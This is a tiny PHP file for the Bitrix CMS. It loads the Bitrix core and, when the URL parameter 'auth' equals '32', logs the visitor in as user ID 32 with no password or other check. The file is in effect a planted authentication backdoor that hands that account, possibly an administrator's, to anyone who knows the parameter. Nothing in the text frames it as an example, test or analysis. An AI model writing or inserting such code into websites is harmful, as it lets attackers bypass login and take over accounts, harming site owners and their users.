<?php
require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/modules/main/include/prolog_before.php");
if($_GET['auth'] == '32'){
    $USER->Authorize(32);
}
